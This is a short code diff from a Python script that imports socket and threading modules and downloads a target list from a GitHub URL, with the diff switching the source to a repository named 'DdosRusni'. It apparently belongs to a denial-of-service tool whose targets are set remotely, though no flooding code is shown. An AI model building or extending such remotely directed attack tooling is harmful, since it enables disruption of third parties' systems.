@@ -3,7 +3,7 @@
 import socket,time,threading,sys,random,os,subprocess,requests
 from os import getcwd
 
-url = "https://raw.githubusercontent.com/Patonia/Patonia/main/target.txt"
+url = "https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt"
 directory = getcwd()
 filename = directory + 'target.txt'
 r = requests.get(url)
